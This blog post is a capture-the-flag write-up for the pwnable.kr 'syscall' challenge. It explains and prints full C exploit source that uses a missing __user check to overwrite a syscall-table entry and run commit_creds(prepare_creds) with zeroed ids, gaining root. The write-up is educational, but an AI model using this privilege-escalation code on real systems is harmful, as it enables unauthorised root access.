---
layout: post
title:  "How to exploit the lack of __user space check in the Linux kernel"
date:   2018-07-19 02:36:41 +0100
categories: jekyll update
---

tags: #pwnable #rookiss #kernel #kernelexploit #syscall #cred

## Challenge

**Linux system call with no __user address space checking.**

[pwnable-kr](pwnable.kr) - Rookiss 'syscall' challange.

Download : [syscall.c](http://pwnable.kr/bin/syscall.c)

ssh syscall@pwnable.kr -p2222 (pw:guest)

**Host:** qemu + busybox emulating ARM vexpress board.

### Site

[pwnable.kr][pwnable-kr]

## Solution

[source code of the exploit on GitHub](https://github.com/bodgergely/wargames/blob/master/pwnable_kr/Rookiss/syscall/exploit_arm.c)

### Gist

1. Install our userspace function in place of the syscall 223

2. Our function should create and install credentials with root id for our process


### Explanation

The kernel has a new syscall on syscall number 223 which will convert lower case bytes to upper case.
The system call defined in syscall.c has a bug! The kernel does not check whether the supplied paramaters are coming from the user address space. (__user__ attribute is missing from the param declaration.)

Since this kernel remapped the syscall table to be writable we can use this sycall to actually overwrite its syscall entry with a function we supply! The linux kernel does not have a separate user and kernel linear virtual address space for performance reasons. 

When a syscall is being executed the linux kernel is running on behalf of a process. It also has access to the address space of the process! This makes it possible to reference userspace memory.
What this means is that we can install our own syscall by overwriting the syscall entry 223 then calling the syscall 223 again.

At this point we also have access to kernel space obviously so we can use kernel functions (we can look them up from /proc/kallsyms as they are readable without sudo on that machine). 
We simply clone the current credentials then we overwrite the new cred structure with the id 0 (root id) then we install the new credentials. After this we can return from the syscall and we have root privileges!



### Plan


0. Lookup the addresses of the following kernel symbols (kernel address space layout randomization is turned off on the host):
   You can use: 
   `cat /proc/kallsyms | grep <symbol>`
    - sys_call_table
    - prepare_creds
    - commit_creds
   sys_call_table is where the function pointers to the syscall handlers are stored.
   struct cred* prepare_creds() is a kernel function (linux/kernel/cred.c) to clone the current cred struct.
   int commit_creds(struct cred*) will install the new credentials to the process.

1. Remap our text section to the heap and make it executable. (Actually it is enough to remap the code that will be executed when in kernel mode)

2. Install our userspace callback function into the 223 syscall entry. The entry 223 is unused - this is where the lower_to_upper syscall is stored originally.
This is done by supplying to the buggy syscall:
    - destination address: 
        sys_call_table + 223*sizeof(void*)
    - source address:
        our remapped callback's address (NOTICE: remap to an address which will result in an address of the callback so that none of the bytes of the address falls into the lowercase value range as the buggy syscall will try to make it uppercase value.)

3. Trigger the syscall 223 again - now are injected callback will be executed. 

4. Now we should have root priviliges and now just simply open and read the /root/flag file.


### The new userspace 'syscall'

On x86 linux kernel uses registers to pass parameters to function if it can so we need to repsect that when using internal kernel functions.
https://kernelnewbies.org/ABI


// Callback to be installed as syscall to change the process credentials    

{% highlight c %}
#define SYS_CALL_TABLE_BASE  0x8000e348       // sys_call_table
#define CRED_PREPARE_CRED    0x8003f44c      // prepare_creds
#define CRED_COMMIT_CRED     0x8003f56c      // commit_creds

typedef void* (*prepare_creds_ty)(void);        // return struct cred*
typedef __attribute__((regparm(1))) int   (*commit_creds_ty)(void*);        // takes struct cred*

void* prepare_creds(void)
{
    return ((prepare_creds_ty)CRED_PREPARE_CRED)();
}

__attribute__((regparm(1)))  // regparam (number) => pass <number> params through registers
int commit_creds(void* cred) 
{
    return ((commit_creds_ty)CRED_COMMIT_CRED)(cred);
}

__attribute__((regparm(1)))
void setid_on_cred(void* cred)
{
    u32* pcred = (u32*)cred;
    int  i = 0;
    // now we should try to 'blindly' modify the uids. struct cred is defined in linux/include/cred.h 
    pcred++;                // jump over the 'usage' field
    for(i=0;i<8;i++) {      // we have 8 'id' members in struct cred - overwrite them with 0 (root id)
        *pcred = 0;         // credential zero is the root id
        pcred++;
    }
}

/*
This is the callback we want to install into syscall number 223 - in place of the original one
*/

int change_cred(char* a, char* b)
{
    int  res = -1;
    void* cred = prepare_creds();
    if(!cred) {
        return -1;
    }
    setid_on_cred(cred);
    res = commit_creds(cred);
    return res;
}

{% endhighlight %}


Once the syscall returns the second time (the first was to exploit the bug and overwrite the syscall entry) we have root priviliges.
Now we can use open() and read() syscalls on the /root/flag file simply in userspace.


### Compilation

`gcc -no-pie -o exploit exploit.c`

no-pie means not position independent code. We need fixed userspace addresses.

Note: On x86 it is very important to add the attribute mregparm=<number> to function interfacing kernel functions in order to pass up to <number> arguments through registers!
The Linux kernel uses ABI that expects that.


### Full source

{% highlight c %}

#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>


// modify the below based on what you see in /proc/kallsyms
#define SYS_CALL_TABLE_BASE  0x8000e348      // sys_call_table
#define NR_SYS_UPPER_CASE	 223             // the unused syscall number we hijack

#define CRED_PREPARE_CRED    0x8003f44c      // prepare_creds
#define CRED_COMMIT_CRED     0x8003f56c      // commit_creds

#define KB 1024
#define MB (KB) * (KB)
#define BUFF_SIZE (KB)*1

#define AL_SZ (4096 * 8)

typedef uint32_t u32;


/*
   Compile with -no-pie. 

   gcc -no-pie -o exploit exploit.c


compile functions used in kernel space with -mregparm=3 beacuse we need the same parameter passing API as the linux kernel
   */



/* 
   asmlinkage long sys_upper(char *in, char* out);

    int __se_sys_setreuid(unsigned ruid, unsigned euid);

    Credentials related:
    --------------------

    struct cred *cred_alloc_blank(void);
    struct cred *prepare_creds(void);
    static int   set_user(struct cred *new)
    int          commit_creds(struct cred *new);

    struct cred is defined in include/linux/cred.h

*/

const char* flagfile = "/root/flag";

typedef void* (*cred_alloc_blank_ty)(void);     // returns struct cred*
typedef void* (*prepare_creds_ty)(void);        // return struct cred*
typedef __attribute__((regparm(1))) int   (*commit_creds_ty)(void*);        // takes struct cred*

//typedef long (*sys_call)(void);


void* prepare_creds(void)
{
    return ((prepare_creds_ty)CRED_PREPARE_CRED)();
}

__attribute__((regparm(1)))  // regparam (number) => pass <number> params through registers
int commit_creds(void* cred) 
{
    return ((commit_creds_ty)CRED_COMMIT_CRED)(cred);
}

__attribute__((regparm(1)))
void setid_on_cred(void* cred)
{
    u32* pcred = (u32*)cred;
    int  i = 0;
    // now we should try to 'blindly' modify the uids. 
    pcred++;                // jump over the 'usage' field
    for(i=0;i<8;i++) {      // we have 8 'id' members in struct cred - overwrite them with 0 (root id)
        *pcred = 0;         // credential zero is the root id
        pcred++;
    }
}

/**
 Callback to be installed as syscall to change the process credentials    
*/
int change_cred(char* a, char* b)
{
    int  res = -1;
    void* cred = prepare_creds();
    if(!cred) {
        return -1;
    }
    setid_on_cred(cred);
    res = commit_creds(cred);
    return res;
}

long lower_to_upper(char* from, char* to)
{
    return syscall(NR_SYS_UPPER_CASE, from, to);
} 

void cop_addr(char* to, char* from)
{
    int i;
    for(i=0;i<4;i++) {
        to[i] = from[i];
    }
}


int main(int argc, char** argv)
{
    void* remapped_addr = atoi(argv[1]);
    unsigned int syscall_entry_addr = SYS_CALL_TABLE_BASE + (NR_SYS_UPPER_CASE * sizeof(char*));

    printf("Want to mmap code to: %p\n", remapped_addr);
    remapped_addr = mmap(remapped_addr, AL_SZ, PROT_EXEC|PROT_READ|PROT_WRITE, 
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(remapped_addr == MAP_FAILED) {
        printf("mmap failed.\n");
        exit(1);
    }

    printf("code got mapped to: %p\n", remapped_addr);
    memset(remapped_addr, '\x90', AL_SZ);

    void* map_start = (void*)0x00008000;
    void* map_end =   (void*)0x00009000;
    int len = map_end - map_start;
    printf("Code length to be copied: %d\n", len);

    // make a little offset here to avoid lower case value byte - might need to manually change!
    remapped_addr += 0x20;

    memcpy(remapped_addr, map_start, len);
    u32 our_rmaped_func = (u32)remapped_addr + ((u32)change_cred - (u32)map_start);
    printf("change_cred addr: %p offset: %u -> Address of remapped func: %p\n",
            change_cred, ((u32)change_cred - (u32)map_start), (void*)our_rmaped_func );

    char fun[5];
    memset(fun, 0 , sizeof(fun));
    cop_addr(fun, (char*)&our_rmaped_func);
    printf("Hit enter to copy our callback %p to syscall table slot: %p\n", (void*)*(unsigned int*)fun,
                                                                            (void*)syscall_entry_addr);
    getchar();
    lower_to_upper(fun, (char*)syscall_entry_addr);

    char store[64];
    memset(store, 0 , sizeof(store));
    printf("Data will be placed at: %p\n", store);
    printf("Hit enter to get our callback triggered!\n");
    getchar();

    // change the credentials
    int r = lower_to_upper(store, store);   // params will not be used actually here anymore
    
    printf("Credentials change return value: %d\n", r);    

    // validate by calling getuid, geteuid 

    int fd = open(flagfile, O_RDONLY, 0);
    if(fd == -1) {
        printf("Failed to open %s\n", flagfile);
        exit(1);
    }

    printf("Opened %s with fd: %d\n", flagfile, fd);
    r = read(fd, store, sizeof(store)-1);
    printf("Read %d num bytes, data:%s\n", r, store);

    // foo();

    return 0;
}


{% endhighlight %}


[pwnable-kr]: http://pwnable.kr/








